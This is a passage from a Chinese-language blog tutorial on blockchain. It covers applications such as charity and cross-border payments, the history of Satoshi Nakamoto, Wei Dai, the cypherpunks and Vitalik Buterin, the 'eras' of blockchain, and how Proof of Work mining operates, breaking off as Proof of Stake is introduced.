src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/10.webp" alt="10"></p></li><li><p><strong>阳光链（区块链慈善）：</strong>区块链的<strong>去中心化，不可篡改和可溯源</strong>与与慈善行业的需求场景高度吻合，阳光链成为了区块链技术在慈善行业的典型应用。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/11.png" alt="11"></p></li><li><p><strong>跨境支付（跨境支付+区块链）：</strong></p><ol><li><p>🚀<strong>传统跨境支付：</strong>跨境支付涉及多种币种，存在汇率问题，传统跨境支付非常依赖于第三方机构，大致的简化模型如下图所示，存在着两个问题：</p><ol><li>流程繁琐，结算周期长</li><li>手续费高</li></ol><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/12.webp" alt="12"></p><blockquote><p>这些问题的存在，很大原因还是<strong>信息不对称</strong>，<strong>没有建立有效的信任机制</strong>。</p></blockquote></li><li><p>🚀<strong>跨境支付+区块链：</strong>区块链的引入，解决了跨境支付信息不对称的问题，并建立起一定程度的信任机制。</p><ol><li><p><strong>效率提高，费用降低：</strong>接入区块链技术后，通过公私钥技术，保证数据的可靠性，再通过加密技术和去中心，达到数据不可篡改的目的，最后，通过P2P技术，实现点对点的结算；去除了传统中心转发，提高了效率，降低了成本（也展望了普及跨境小额支付的可能性）。</p></li><li><p><strong>可追溯，符合监管需求：</strong>传统的点对点结算不能不规模应用，除了信任问题，还有就是存在监管漏洞（点对点私下交易，存在洗黑钱的风险），而区块链的交易透明，信息公开，交易记录永久保存实现了可追溯，符合监管的需求。</p></li></ol><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/13.webp" alt="13"></p></li></ol></li></ol><blockquote><p>看了这么多实际案例，不管你看明白了几个，是否对区块链的特</p><p>点与优势有了进一步的了解呢 <strong>QAQ</strong>？<img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/8.jpg" alt="8" style="zoom:20%;"></p><p>让我来考考你吧！准备好了吗🙆‍</p></blockquote><h3 id="🚀请回答出区块链的至少四个特点"><a href="#🚀请回答出区块链的至少四个特点" class="headerlink" title="🚀请回答出区块链的至少四个特点"></a><strong>🚀请回答出区块链的至少四个特点</strong></h3><hr><h2 id="3-区块链风云历史（重点）"><a href="#3-区块链风云历史（重点）" class="headerlink" title="3. 区块链风云历史（重点）"></a>3. 区块链风云历史（重点）</h2><blockquote><p> <strong>【为什么】要了解区块链的历史 ?</strong></p><p> 帅气的 <strong>Science_Jun【doge🐕】</strong>曾言：历史是一面镜子，它照亮现实，也照亮未来（好吧，其实是赵鑫珊老师说的~）</p><p> 恰如此言之意：了解一门技术的发展历程，尤其是区块链这位万众瞩目的后起之秀，正是起着<strong>继往开来以明志</strong>的作用。（好吧摊牌了，其实也是为了和你不了解区块链的朋友或同事<strong>吹牛逼</strong> 🐂）但这不是重点！<strong>重点</strong>是如果你和懂区块链的人聊了起来，当他谈起<strong>v神</strong>的传奇历史，你的脑海里却只浮现出四个字：<strong>v神是谁….？</strong>这不得尴尬地脚趾抠出三室一厅了…</p> <img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/1.jpg" alt="1" style="zoom: 33%;"></blockquote><p><a href="%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%BA%E4%B8%80%E7%A7%8D**%E6%96%B0%E5%9E%8B%E5%88%9B%E9%80%A0%E4%BF%A1%E4%BB%BB**%E6%8A%80%E6%9C%AF%EF%BC%8C%E5%AE%9E%E7%8E%B0%E4%BA%86%E7%82%B9%E5%AF%B9%E7%82%B9%EF%BC%88P2P%EF%BC%89%E7%9A%84%E4%BB%B7%E5%80%BC%E4%BC%A0%E9%80%92%EF%BC%8C%E5%8F%97%E5%88%B0%E4%BA%86%E5%BE%88%E5%A4%9A%E8%A1%8C%E4%B8%9A%E7%9A%84%E8%BF%BD%E6%8D%A7%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E7%9B%AE%E5%89%8D%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%91%E5%B1%95%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%AF%E4%BB%A5%E5%BA%94%E7%94%A8%E7%9A%84%E8%A1%8C%E4%B8%9A%E6%9C%89%E5%93%AA%E4%BA%9B%E5%91%A2%EF%BC%9F">^前言</a>: 区块链发展的历史可不是简简单单就能描述完的，真要彻头彻尾的讲完整，我想大家需要准备一下睡衣睡裤了Σ(っ °Д °;)っ所以在此之前我需要向大家提出区块链绕不开的名人，以便大家快速鸟瞰这区块链发展的长河</p><h3 id="💎中本聪-amp-Wei-Dai-——-灵光乍现的渊源"><a href="#💎中本聪-amp-Wei-Dai-——-灵光乍现的渊源" class="headerlink" title="💎中本聪&amp;Wei Dai —— 灵光乍现的渊源"></a>💎中本聪&amp;Wei Dai —— 灵光乍现的渊源</h3><blockquote><p>早在2008年11月1日，一个名叫<strong>中本聪</strong>的极客为了表达对政府肆意制造通货膨胀的不满，发表了一篇名为**<u>《比特币：一种点对点式的电子现金系统》</u>**的论文，这篇文章，标志了区块链技术的正式诞生。</p><p>然而，很多人不知道的是，其实区块链的底层构想并不是由中本聪最先提出。早在比特币诞生的前10年，就由一位名为<strong>Wei Dai</strong>的华人密码学家放在了他的一个名为<strong>B- Money</strong>的研究之中。</p></blockquote><h4 id="⭐【神秘人中本聪】"><a href="#⭐【神秘人中本聪】" class="headerlink" title="⭐【神秘人中本聪】"></a>⭐【神秘人中本聪】</h4><p> 区块链世界里最神秘的人，非比特币发明者中本聪莫属。</p><p>现在唯一可以确定的是，中本聪是比特币的第一个矿工。</p><ul><li>2009年1月3日，中本聪挖出了第一个比特币区块，也称<u>创世区块</u>，并获得了50个比特币的系统奖励。</li><li>2009年2月11日，中本聪注册了P2P Foundation，资料显示，中本聪是一个43岁的日本男性，至于该信息是真实的，还是中本聪的障眼法，不得而知。当天，中本聪在上面声称，他开发了一个叫比特币的电子现金系统，并给出了开源代码。</li><li>2010年12月5日，在维基解密泄露美国外交电报事件期间，比特币社区呼吁维基解密接受比特币捐款，以打破封锁。为保护襁褓中的比特币，中本聪义无反顾地站出来，<u>坚决反对捐款</u>，他的理由是：比特币还很弱小，经不起冲击和争议。</li><li>2010年12月12日，中本聪在比特币论坛中发表了最后一篇文章，提及了最新版本软件中的一些小问题。此后，仅通过电子邮件与比特币核心开发团队的少数人保持联系，不再公开发表任何言论。</li><li>2011年4月26日，中本聪在一封电子邮件中写道：“我已转移到其他事物上去了。”从此，中本聪的电子邮件关闭了。</li><li>2014年，Newsweek发布新闻，表示自己找到了中本聪本人——多利安·中本聪；9月13日，中本聪突然发帖否认此事，随后，多利安·中本聪也表示，自己并不是比特币创始人中本聪。</li><li>2018年11月29日，时隔多年，“中本聪”账号发布了仅有一词的状态<u>“Nour”</u>，引起比特币社区热议，但不知是黑客入侵还是真的中本聪在操作。</li></ul><p>现在，虽然有无数研究者、情报人员调查过他的真实身份，但至今未得到核实。</p><hr><p>【💎<strong>讲点有意思的，坊间关于中本聪的猜测：】</strong></p><p><strong>1、外星人</strong></p><p>有人大胆猜想，是不是像科幻电影里常见的剧情，一个月黑星高的夜晚，外星人中本聪乘坐飞碟，悄无声息地来到地球，把比特币的开源代码传到互联网上。当他的光荣使命完成后，又选择了默默地离开，不带走一片云彩。</p><p><strong>2、未来穿越者</strong></p><p>有人开脑洞地认为，中本聪可能是未来人，为了平衡目前经济社会的资本，穿越到了这个时代，创造了比特币。</p><p><strong>3、已离世</strong></p><p>有人猜想，中本聪有可能得了重病或者遭遇意外，在2011年便去世了，因此中本聪掌握的比特币私钥也一起消失了，100多万个比特币将永久沉睡。</p><p><strong>4、一个团队</strong></p><p>有人研究了比特币的代码，认为太精妙了，不像单个人所为，更像一个团队写的。可能这个团队都是顶尖人才，创造比特币是一个长久以来的计划，酝酿了几年时间，最后才慢慢成型的。</p><p><strong>5、英国人</strong></p><p>理由是，他会用很溜的英式英语，他的活动时差显示他主要生活在美国，加上他取了一个日本名字，所以说，他是披着日本外衣在美国生活的英国人。但这些特征，也可能是中本聪用的障眼法。</p><p>最后，你可能会好奇地问，有了这么伟大的成就，<a href="http://mp.weixin.qq.com/s?__biz=MzUyNzE4MDM2MA==&chksm=fa01d435cd765d2337c5f8c0b3c39cef62239509427f80e70ab129e2b2cd497fc6dca6dd638a&idx=2&mid=2247492370&scene=21&sn=8ab204a6c437a83052938abbc68e9889#wechat_redirect">有了巨大的财富</a>，为什么中本聪还要隐藏自己呀？</p><p><strong>其中一个猜测是，中本聪对去中心化的理念非常执着，他觉得只有自己消失，比特币的系统才会是安全的去中心化。</strong></p><p>不管中本聪是“他”，是“他们”，还是“它”，中本聪已经改变了这个世界，<strong>每一个为比特币做过贡献的或者正在做贡献的人，其实都是中本聪！</strong></p><p>[^想了解更多的同学来这吧~]: <a href="https://baike.baidu.com/item/%E4%B8%AD%E6%9C%AC%E8%81%AA/5740822?fr=aladdin">中本聪_百度百科 (baidu.com)</a><br>[^中本聪的那篇论文，实在有兴趣的同学可以观摩(￣▽￣)]:   <a href="%5Bbitcoin.pdf%5D(https://bitcoin.org/bitcoin.pdf)">《比特币：一种点对点式的电子现金系统》</a><br>[^以上部分内容取自]: <a href="https://blog.csdn.net/mrRqAEr7ci9s2v0/article/details/113285330">科普|中本聪到底是谁？</a></p><p>🚀大家都知道中本聪提出了区块链技术，而知道<strong>Wei Dai</strong>的人却寥寥无几，那么<strong>Wei Dai</strong>到底是何方神圣？</p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/Users\施万俊0728\Desktop\区块链blog图片\重点.webp" alt="重点" style="zoom: 33%;"><p>🚀说起<strong>Wei Dai</strong>，那么便绕不开一个神秘的组织——<strong>密码朋克</strong>！</p><hr><h3 id="💎密码朋克——区块链的重要精神先驱"><a href="#💎密码朋克——区块链的重要精神先驱" class="headerlink" title="💎密码朋克——区块链的重要精神先驱"></a>💎密码朋克——区块链的重要精神先驱</h3><blockquote><p>​         在比特币之前，区块链的很多基础技术概念其实都来自于一个于1993年成立的神秘邮件列表组织——<strong>密码朋克（Cypherpunk）</strong>。</p><p>​         密码朋克是一个<strong>提倡使用强加密算法来保持个人隐私安全的“极客组织”</strong>，其成员有很多我们如今耳熟能详的计算机大佬们，包括维<strong>基解密的创始人朱利安·阿桑奇、“万维网之父”蒂姆伯纳斯·李、Facebook的原创始人肖恩·帕克等等，当然，也包括Wei Dai和中本聪。</strong></p><p>​         早在上个世纪90年代末，密码朋克就诞生了很多对日后区块链影响深远的基础构想和技术，包括亚当·贝克发明的<strong>PoW算法</strong>、斯图尔特·哈伯和斯科特·斯托内塔提出的用时间戳方法保证数字文件安全的协议，Wei Dai所提出的匿名、分布式的电子加密货币系统等。<strong>因此从某种程度上来说，区块链技术其实并不是中本聪灵光乍现的原始发明，而是对密码朋克群组一系列技术的集大成。</strong></p><p>​         其中，Wei Dai所提出的B-money构想可以说是<strong>区块链的重要精神先驱</strong>。[B-money可以理解为用B换钱，这样就好记了(<em>^_^</em>)]</p><p>​          <strong>B-money 的设计在很多关键的技术特质上与比特币非常相似。</strong>它率先提出了分布式账本的理念，要求所有的账户持有者共同决定计算量的成本并就此达成一致意见，并首次引入了<strong>PoW机制、数字签名、P2P交易、智能合约、身份验证</strong>等概念。</p><p>​         但作为一个并不完备的构想，当时的B-money在很多内容上都是浅尝辄止，在共识模型、奖惩机制、货币的创造等方面没有提出详细的解决方案，因此只是停留在了设计层面并没有付诸实践，在当时也没有引起很大的水花。</p><p>​         一直到2008年，中本聪<strong>基于前人的各种想法开始设计比特币</strong>。整理成文后他首先将文章发给了<strong>PoW算法</strong>的发明者亚当·贝克，亚当·贝克看完后发现比特币的运行机制跟Wei Dai多年前提出的B-Money有很多相似之处，于是建议中本聪要引用一下B-Money。<strong>接着，中本聪去认真研读了B-Money后也惊奇地发现早在十年前Wei Dai就和自己有了几乎一样的想法，同时又借鉴了B-Money里的一些机制对比特币进行了完善。</strong></p></blockquote><p>⚽想要进一步了解B-money这一<strong>创世的构想</strong>，可以去参考这篇文章 <a href="https://www.panewslab.com/zh/articledetails/D44115590.html">WeiDai的B-Money，也许是比特币的初稿</a></p><h4 id="⭐【纪念WeiDai】"><a href="#⭐【纪念WeiDai】" class="headerlink" title="⭐【纪念WeiDai】"></a>⭐【纪念WeiDai】</h4><p>📕很可惜，<strong>Wei Dai</strong>到如今都仍是以神秘人的身份出现在世人目光范围里，且只有极少数人知道他，或许这就是属于一代极客的浪漫——<u>“事了拂衣去，深藏功与名”</u>。B-money是密码朋克社区对研发数字世界中的独立自主的货币的又一次探索，2013年，Vitalik Buterin一手构建的以太坊（Ethereum）最小单位<strong>Wei</strong>，便以他的名字命名。</p><ul><li>向勇于探索的前辈致敬<img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/3.jpg" alt="3" style="zoom:25%;"></li><li>知道他你就可以和你的区块链朋友一起吹🐂了[doge]</li></ul><h3 id="💎Vitalik-Buterin——鲜衣怒马少年时"><a href="#💎Vitalik-Buterin——鲜衣怒马少年时" class="headerlink" title="💎Vitalik Buterin——鲜衣怒马少年时"></a>💎Vitalik Buterin——鲜衣怒马少年时</h3><p><strong>简介：</strong>我想用<strong>鲜衣怒马少年时</strong>来描述V神比较合适：</p><ul><li><p>5岁时便开始接触编程语言</p></li><li><p>7岁独自创建了一个叫“兔子百科全书”的复杂文档</p></li><li><p>12岁起就用C++编写给自己玩的小游戏</p></li><li><p>13-16岁青春期网瘾少年，沉迷<strong>魔兽世界</strong></p><p>（终于找到和我一样的经历了&#x2F;(ㄒoㄒ)&#x2F;~~）</p></li><li><p>网瘾少年到一代神话的奇幻转折 </p></li><li><p>17岁从父亲口中听说到比特币</p></li><li><p>省略一万字……………………..</p></li><li><p>25岁身价上百亿美元</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/18.webp" alt="18"></p></li></ul><blockquote><p>Vitalik Buterin，就是我们常说的V神，区块链世界传奇⼈物，⾝家⼀度超过了巅峰时期的马云。</p><p>Vitalik Buterin的成功来⾃两个⽅⾯：⼀是从⼩就展现出来的过⼈智商和⾮凡天赋，他只花了⼏个⽉的时间，就学会了加拿⼤当地的语⾔，甚⾄在⾝边的伙伴还懵懵懂懂的时候，Buterin已经⽤他4岁时收到的礼物——⼀台个⼈电脑撰写⾃⾏计算的程序了；另⼀⽅⾯则是碰上了难得⼀遇的好时机——区块链时代的到来！</p><p>Vitalik Buterin，1994年出⽣于俄罗斯，5岁的时候，⽗母离婚，跟随⽗亲移民到了加拿⼤。他⾃⼩在数学上就有很⾼的天赋，在⼤部分⼈九九乘法表还没背全的时候，Buterin的三位数⼼算速度已经是同龄⼈的两倍。在⼩学三年级的时候，他便被安排进了“天才⼉童班”，学习数学、编程和经济学等科⽬。</p><p>7岁的时候，Buterin创建了⼀个叫做”兔⼦百科全书“的复杂⽂档，这是⼀个由兔⼦组成的⼩世界，但世界⾥的规则符合⾮常严格的公式，⾥⾯全是数学，图表和计算。Buterin读五六年级的时候，很多⼈认为他是数学天才。12岁起，Buterin已经可以⽤程式语⾔C++撰写简单的游戏给⾃⼰玩了。</p><p>这样⼀路成长下去，Buterin或许就成为⼀名优秀的程序员了，但事情往往却⼀波三折。在13岁到16岁的时候，Buterin沉迷于《魔兽世界》中，摇⾝⼀变成了⼀个⽹瘾少年，经常⼀玩游戏就是⼀整天。直到</p><p>【<u><strong>有⼀次暴雪在版本更新中，取消了Buterin最喜爱的⾓⾊——术⼠的“⽣命虹吸”技能，使得Buterin悲痛欲绝，并多次发邮件和在官⽅论坛⾥联系了暴雪的⼯程师，要求他们还原这个技能，但是得到的回复都是出于游戏平衡才这么做的，不能恢复。</strong></u></p><p><u><strong>Buterin对这种中⼼化组织主导⼀切的状况产⽣了不满。在互联⽹游戏⾥，最⼤弊端就是⼀切由开发商说了算，⽽玩家只能选择被动接受，或者离开。所以，他选择了放弃玩魔兽。</strong></u>】</p><p>2011年，17岁的Buterin从他⽗亲那听到了⽐特币，⼀开始他和当时的⼈们⼀样，并不认为⽗亲兴奋提及的数字货币有任何实际价值。Buterin的⽗亲是⼀家区块链孵化器Blockgeeks Labs的<strong>联合创始⼈</strong>。这位送给他第⼀台电脑、买给他电脑科学书籍的⽗亲，也是⼀路以来⿎励他探索的启蒙导师和伙伴。<u>在他⽗亲宣扬下，Buterin<strong>开始认识到了⽐特币的真正意义所在，并被区块链技术的去中⼼化属性给深深地吸引了</strong>。</u></p><p>基于对⽐特币及区块链技术的浓厚兴趣，Buterin开始在⽹络上撰写相关的⽂章，主要涉及到区块链技术以及潜在的社会影响，彼时的他还未满18岁。Buterin的⽂章很受欢迎，每篇帖⼦⼤概能得到5个⽐特币（时价4美元左右）的“打赏”。2011年9⽉，Buterin以联合创始⼈以及主要撰稿⼈的⾝份会同罗马尼亚程序员Mihai Alisie创建了“⽐特币杂志”，这是⼀份实体和在线的出版物，直到2015年被收购前，该杂志积累了⼤概150万名读者。</p><p>Buterin19岁时，也就是2013年的时候，被加拿⼤滑铁卢⼤学（计算机专业世界排名第18位）录取，学习计算机科学。<u>但8个⽉后，Buterin便选择了和⽐尔盖茨和扎克伯格⼀样的道路——辍学</u>，毅然踏上了周游世界之路，与世界各地的区块链爱好者交流和互相学习，⽽他的⽗亲对此也是乐见其成。这段时间正值⽐特币第⼀个爆发期，短时间内1btc的价格从⼏⼗美元上涨到1000多美元，这为Buterin带来了⼈⽣的第⼀桶⾦。</p><p>2013年年末，周游世界归来后的Buterin有了些新想法。当时的⽐特币爱好者正在全⼒以赴地为⽐特币增加更多的功能性，打造⽐特币2.0。但Buterin认为，建⽴⼀个全新的编程语⾔才是⽐特币的当务之急。<u>出于安全原因，⽐特币的开⼭⿐祖中本聪⽤了⼀种复杂的脚本语⾔编写了⽐特币协议，然⽽这种语⾔有意地限制了交易的复杂性，也导致了⽐特币⼀直没有开枝散叶，孵化出更多的应⽤。</u></p><p>针对这种状况，<u>Buterin打算⽤⼀种<strong>通⽤的脚本语⾔</strong>，打造⼀款新的计算平台和新的加密货币，于是他很快就写下了⼀篇⽩⽪书，并在⽂中介绍了以太坊。19岁的Vitalik Buterin给他的好友们发了以太坊⽩⽪书。这款新的⽐特币将基于通⽤的编程语⾔，可以⽤来创建各种各样的应⽤，⽐如社交、交易、游戏……Buterin发给了15个⼈，这15个⼈⼜相继发给了他们的好友。⼀传⼗，⼗传百，Buterin的想法很快就在⽐特币社区⾥获得了⼀致的好评。</u></p><p>和其他的加密货币⼀样，<u>Buterin决定⽤ICO的⽅式进⾏众筹</u>，⽤户可以⽤⽐特币来预购以太币。以太币的定价是2000个以太币 1个⽐特币，按照当时每个⽐特币600美元的价格，⼀个以太币是0.3美元。</p><p>最终，这次ICO⼀共募集了31,000个⽐特币，即1,800万美元，这让它成为了加密货币历史上价值第⼆⾼的ICO。有了这笔钱，Buterin的团队很快在瑞⼠成⽴⼀家⾮盈利公司Ethereum Foundation。<u>Buterin也因为对⽐特币2.0的发展贡献，从⽽击败了Facebook创始⼈Mark Zuckerberg，获得2014年IT软件类世界技术奖。这个奖项表彰了V神设计发展以太坊（Ethereum）的突出成就。</u></p><p>2015年6⽉，第⼀款以太坊发布，取名Frontier，所有承诺给早期投资者的以太币被顺利地交付，开发者们也开始在以太坊上编织他们的梦想。两年间，以太坊的出现激活了区块链背后的巨⼤潜⼒：以太币的价格在2017全年翻了85倍；由以太坊奠基的ICO在2017年成为最⽕的资⾦众筹⽅式，全球通过ICO募集了超过40亿美元；</p><p><u>2017年，全球电⼦货币的市场总值从年初的180亿美元暴涨到5600亿美元。</u></p></blockquote><p>[^ICO]: Initial Coin Offering，首次币发行，源自股票市场的首次公开发行（IPO）概念，是区块链项目首次发行代币，募集比特币、以太坊等通用<a href="https://baike.baidu.com/item/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81/8159530">数字货币</a>的行为。</p><h3 id="💎时间节点——区块链的跨时代"><a href="#💎时间节点——区块链的跨时代" class="headerlink" title="💎时间节点——区块链的跨时代"></a>💎<strong>时间节点——区块链的跨时代</strong></h3><ol><li><p><em><strong>区块链1.0时代（2009-2013）：</strong></em></p><p>⭐标志事件：署名为“中本聪”的匿名人士发表论文《比特币：对等网络电子现金系统》，标志着区块链的世界打开大门。</p><p>⭐阶段特点：该阶段主要关注数字货币的回报率，而非其应用价值。</p></li><li><p><em><strong>区块链2.0时代（2014-2017）：</strong></em></p><p>⭐标志事件：2013年11月，V神发布了以太坊白皮书，区块链的特性形成了信任基础。</p><p>⭐阶段特点：为智能合约提供了可信任的执行环境，扩大了对金融领域更广泛的场景和流程进行优化的应用，使得所有金融交易都可以被改造成在区块链上使用。以太坊与比特币的最大区别，是其支持脚本语言应用开发，可以实现智能合约。</p></li><li><p><em><strong>区块链3.0时代（2018-至今）：</strong></em></p><p>⭐标志事件：2017年底起，稳定币USDT的交易开始显著放量，2017年12月，借贷类DeFi项目MakerDAO上线，其中也用到了稳定币的技术。</p><p>⭐阶段特点：3.0时代是超越货币和金融范围的泛行业去中心化应用，特别是在政府、医疗、科学、文化和艺术等领域的应用。</p></li></ol><h3 id="🌙跨时代总结"><a href="#🌙跨时代总结" class="headerlink" title="🌙跨时代总结"></a><strong>🌙跨时代总结</strong></h3><p>​        <strong>实际上不难看出，区块链的跨时代实际上就是三种数字货币的诞生与爆发：1.0是最早的比特币（BTC）创世，开辟区块链时代，为天才少年V神的横空出世奠定了时代基础；2.0是以太坊（Ethereum）的信任机制建立，区块链的无限可能性在此萌芽，为USDT的交易奠定了信任基础；3.0则是泰达币（USDT）交易的放量增长，为后续区块链技术的衍生提供了价值基础；因此在当今所有交易所我们都可以看到，只有这三种数字货币一直是首页大屏的“不动明王”，并且价值排序是呈阶梯型递减的，在我看来，未来也难以撼动他们的地位。我们是不是可以推断：能够越早占据时间长河的前瞻位置，也就能越早地掌握经久不衰的财富密码。因此，在持久学习的道路上，掌握技术能够让你站稳脚跟，而回望历史则是站在时代巨人的肩上去目睹苦难和机遇并存，去仰望星空，开拓视野，进而去探索宇宙；这，就是为什么我要去介绍区块链发展历史的真正缘由。</strong></p><h3 id="🌙畅想未来"><a href="#🌙畅想未来" class="headerlink" title="🌙畅想未来"></a><strong>🌙畅想未来</strong></h3><p><strong>畅想一下区块链4.0时代的到来是因为什么？</strong></p><p>[^部分内容来自于]: <a href="https://blog.csdn.net/mrRqAEr7ci9s2v0/article/details/113285330">科普 | 比特币创始人中本聪是谁？</a></p><h2 id="4-【挖矿】到底是什么——区块链的核心技术"><a href="#4-【挖矿】到底是什么——区块链的核心技术" class="headerlink" title="4.【挖矿】到底是什么——区块链的核心技术"></a>4.【挖矿】到底是什么——区块链的核心技术</h2><h3 id="💎挖矿，到底是什么？（引言）"><a href="#💎挖矿，到底是什么？（引言）" class="headerlink" title="💎挖矿，到底是什么？（引言）"></a>💎挖矿，到底是什么？（引言）</h3><p><strong>简短概括：</strong>挖矿——就是通过贡献计算机的计算力来换取虚拟货币的奖励。这么说确实略显抽象，别着急，咱先走为上。</p><p>提起挖矿，大家最近是否注意到一个现象：<strong>电脑显卡的价格暴涨，</strong>迎来了十几年来的一次价格高峰；俗话说，物以稀为贵，供求关系不平衡才会如此，那么谁是罪魁祸首呢？毫无疑问——矿机！挖矿需要矿机来作为硬件基础，而矿机的核心性能取决于显卡，矿工们为了更好地争夺虚拟货币的奖励，就不得不买算力更加强大的矿机，也就意味着更好的显卡，消耗更多的电费。这些，就是在挖矿中最重要的<strong>物理基础。</strong></p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/15.webp" alt="15"></p><p>那么，挖矿的物理基础有了，挖矿的规则是什么来决定的呢？答案就是PoW工作量证明机制，请随我来~</p><h3 id="💎共识机制——区块链的信任基础"><a href="#💎共识机制——区块链的信任基础" class="headerlink" title="💎共识机制——区块链的信任基础"></a>💎共识机制——区块链的信任基础</h3><h4 id="A-PoW（Proof-of-Work）工作量证明机制"><a href="#A-PoW（Proof-of-Work）工作量证明机制" class="headerlink" title="A. PoW（Proof of Work）工作量证明机制"></a>A. PoW（Proof of Work）工作量证明机制</h4><p>上面的例子并不是题外话，相信聪明的你早已窥见了端倪，这实际上就是PoW机制的过程简述。</p><p>📕<em><strong>PoW：</strong></em> 也称挖矿，它是需要完成一定的工作量（Hash计算）来证明获取记账权。它是最早应用在区块链技术上的共识机制，也是区块链应用领域使用最为广泛、最为成熟的共识机制。比特币区块链系统就是使用PoW共识机制。</p><p><strong>📕PoW算法在区块链实现过程：</strong></p><ol><li><p>先定义一个固定的256位长度初始数，比如：长度为256位的 0000…0001 （<strong>相当于32字节，64字符，一字节为8位，一字符为4位</strong>）</p></li><li><p>设置难度系数值，比如：如果难度系数定义为前面4个0，即16位长度（0000 0000 0000 0001 &#x3D; 4个字符&#x3D; 2个字节）</p></li><li><p>按照难度系数值进行<strong>移位操作</strong>，将Hash工作量值扩大， 向左移 （256-难度系数N位）比如： 将初始数 0000…..0001 向左移（256-16位）得到： 0000 0000 0000 0001 0000 …0000.</p></li><li><p>将随机数Nonce递增加1再加上区块头（Block Header）Hash值拼接，然后进行SHA256 Hash运算。</p></li><li><p>将计算结果值与当前难度系数目标值做对比，<strong>如果当前计算值大于难度系数条件值，即继续递增Nonce值再进行下一次的SHA256 Hash运算</strong>，直到计算出的结果Hash值少于目标值，则才认为解题成功，此次的工作量证明完成并获得记账权，然后进行对交易区块进行打包确认并广播给全节点。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/20.png" alt="20"></p></li></ol><p>[^Nonce]: Nonce是Number once的缩写，在密码学中Nonce是一个只被使用一次的任意或非重复的随机数值。</p><h5 id="📕简单理解五步曲："><a href="#📕简单理解五步曲：" class="headerlink" title="📕简单理解五步曲："></a>📕简单理解五步曲：</h5><p>Looping （循环）{</p><ol><li>准备初始数据</li><li>设置难度系数</li><li>通过SHA256 对数据进行Hash</li><li>将Hash转成大整数（big.Int）</li><li>将大整数与难度系数目标值比较。</li></ol><p>}</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/19.png" alt="19"></p><p>📕<em><strong>公式表达：</strong></em><br>$$<br>SHA256 ( Nonce + blockheader ） &lt;  目标值的难度系数<br>$$<br>📕<em><strong>优点：</strong></em></p><ol><li>完全去中心化；</li><li>节点自由进出，有利于节点网络扩大；</li><li>用户的参与度与信任度高，对于用户来说实现真正的公平，公正竞争。</li></ol><p>📕<em><strong>缺点：</strong></em></p><ol><li>最大缺点就是造成的资源浪费，争夺记账权需要不停地循环计算哈希值；</li><li>达成共识的周期过长，<strong>导致产生新区块效率比较低</strong>，大概每10分钟才产生一个新区块，这不适于商业应用。</li></ol><h4 id="B-PoS机制（Proof-of-Stake）权益证明机制"><a href="#B-PoS机制（Proof-of-Stake）权益证明机制" class="headerlink" title="B. PoS机制（Proof of  Stake）权益证明机制"></a>B. PoS机制（Proof of  Stake）权益证明机制</h4><p><a href="%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%BA%E4%B8%80%E7%A7%8D**%E6%96%B0%E5%9E%8B%E5%88%9B%E9%80%A0%E4%BF%A1%E4%BB%BB**%E6%8A%80%E6%9C%AF%EF%BC%8C%E5%AE%9E%E7%8E%B0%E4%BA%86%E7%82%B9%E5%AF%B9%E7%82%B9%EF%BC%88P2P%EF%BC%89%E7%9A%84%E4%BB%B7%E5%80%BC%E4%BC%A0%E9%80%92%EF%BC%8C%E5%8F%97%E5%88%B0%E4%BA%86%E5%BE%88%E5%A4%9A%E8%A1%8C%E4%B8%9A%E7%9A%84%E8%BF%BD%E6%8D%A7%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E7%9B%AE%E5%89%8D%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%91%E5%B1%95%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%AF%E4%BB%A5%E5%BA%94%E7%94%A8%E7%9A%84%E8%A1%8C%E4%B8%9A%E6%9C%89%E5%93%AA%E4%BA%9B%E5%91%A2%EF%BC%9F">^前言</a>: 在2012年，由加密货币点点币的创始人Sunny King 为了解决PoW中资源浪费的缺点而提出的新的共识概念，他在基于比特币PoW的框架基础上实现了新的共识机制PoS，并最初被应用在点点币区块链系统上。</p><h5 